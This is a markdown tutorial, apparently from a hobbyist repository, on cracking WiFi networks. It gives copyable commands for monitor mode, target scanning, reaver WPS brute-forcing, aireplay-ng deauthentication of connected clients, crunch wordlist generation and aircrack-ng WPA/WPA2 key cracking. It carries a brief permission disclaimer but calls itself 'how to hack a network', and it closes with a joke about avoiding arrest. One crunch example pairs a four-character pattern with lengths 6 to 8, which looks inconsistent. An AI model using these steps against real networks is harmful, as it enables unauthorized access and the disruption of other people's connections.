
# WiFi Penetration Testing Guide

> **Disclaimer:** This guide is for educational purposes only. Use these tools exclusively on networks you own or have explicit permission to test. Unauthorized use may be illegal.

---

## Table of Contents
- [Introduction](#introduction)
- [Prerequisites](#prerequisites)
- [Setting Up Monitor Mode](#setting-up-monitor-mode)
- [Network Scanning](#network-scanning)
- [Performing WPS Attacks](#performing-wps-attacks)
- [Capturing WPA/WPA2 Handshakes](#capturing-wpapawpa2-handshakes)
- [Cracking WPA/WPA2 Passwords](#cracking-wpapawpa2-passwords)

---

## Introduction

Greeting this is how to hack a network maybe one of the easiest way if not the easiest, happy hacking :3

---

## Prerequisites

Before you begin, ensure you have:
- **Operating System:** A Linux distribution (Kali Linux is highly recommended for beginners).
- **Wireless Adapter:** An adapter that supports monitor mode and packet injection.
- **Required Tools:** Tools such as `aircrack-ng suite`, `wash`, `reaver`, and `crunch` should be installed (preinstalled on kali).
- **Basic Command Line Skills:** Familiarity with using the Linux terminal will help you follow along.

---

## Setting Up Monitor Mode

Monitor mode allows your wireless adapter to capture all traffic within range.

### 1. List Available Interfaces
```bash
iwconfig
```
This command displays all available wireless devices.

### 2. Disable the Interface

Replace `wlan1` with your adapter's name.
```bash
ifconfig wlan1 down
```

### 3. Stop Interfering Processes
```bash
airmon-ng check kill
```
This stops processes that might interfere with monitor mode.

### 4. Enable Monitor Mode
```bash
iwconfig wlan1 mode monitor
```

### 5. Re-enable the Interface
```bash
ifconfig wlan1 up
```

### 6. Verify Monitor Mode
Run `iwconfig` again to confirm that your interface is now in monitor mode.

---

## Network Scanning

With your adapter in monitor mode, you can now scan for nearby networks.

### Scan 2.4 GHz Networks
```bash
airodump-ng wlan1
```

### Scan 5 GHz Networks
```bash
airodump-ng --band a wlan1
```

### Scan Both Bands (2.4 GHz & 5 GHz)
```bash
airodump-ng --band abg wlan1
```

### Capture Scan Data
Replace `<target_mac>` with the network's MAC address and `<channel>` with its channel.
```bash
airodump-ng --bssid <target_mac> --channel <channel> --write <file name> wlan1
```
example:
```bash
airodump-ng --bssid 00:11:22:33:44:55 --channel 2 --write test.txt wlan1
```

This command saves the scan results to a file for further analysis.

---

## Performing WPS Attacks

WPS attacks target routers with Wi-Fi Protected Setup enabled. This section explains the process step-by-step.

### 1. Identify Networks with WPS Enabled (WAY EASIER THAN WPA/2)
```bash
wash --interface wlan1
```
This lists nearby networks that support WPS.

### 2. Execute a WPS Attack
Replace `<target_mac>` and `<channel>` with the appropriate values.
```bash
reaver --bssid <target_mac> --channel <channel> --interface wlan1 -vvv --no-associate
```
- **`-vvv`:** Enables detailed output, helpful for understanding what’s happening.
- **`--no-associate`:** Uses manual association, which can sometimes yield better results.

---

if all goes to plan it should show you the password if not carry on with the WPA/2

## Capturing WPA/WPA2 Handshakes

Capturing the handshake between a router and a connected client is key to testing WPA/WPA2 security.

### 1. Start Handshake Capture
Replace `<target_mac>` and `<channel>` with your target’s details.
```bash
airodump-ng --bssid <target_mac> --channel <channel> --write <file name> wlan1

```
Let this command run until a handshake is captured.
example: 
```bash
airodump-ng --bssid 00:11:22:33:44:55 --channel 2 --write wpa_handshake wlan1
```

### 2. Accelerate Handshake Capture with Deauthentication
Force a connected client to reconnect by deauthenticating them:
```bash
aireplay-ng --deauth 4 -a <target_mac> -c <client_mac> wlan1
```
- **`-a`:** Specifies the target network's MAC address.
- **`-c`:** Specifies the client's MAC address.

---

## Cracking WPA/WPA2 Passwords

Once a handshake is captured, you can attempt to crack the network password using a wordlist.

### 1. Generate a Wordlist Using Crunch
For example, to create a wordlist for passwords of length 6 to 8:
```bash
crunch 6 8 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt
```
You can also incorporate patterns:
```bash
crunch 6 8 abc123 -t @@@@ -o wordlist.txt
```

### 2. Crack the Password with Aircrack-ng
```bash
aircrack-ng wpa_handshake-01.cap -w wordlist.txt
```
- **`wpa_handshake-01.cap`:** The file containing the captured handshake.
- **`wordlist.txt`:** Your generated wordlist.

Aircrack-ng will try each password from the wordlist against the handshake until a match is found (will take some time).

---

**Don't get yourselves arrested lol**
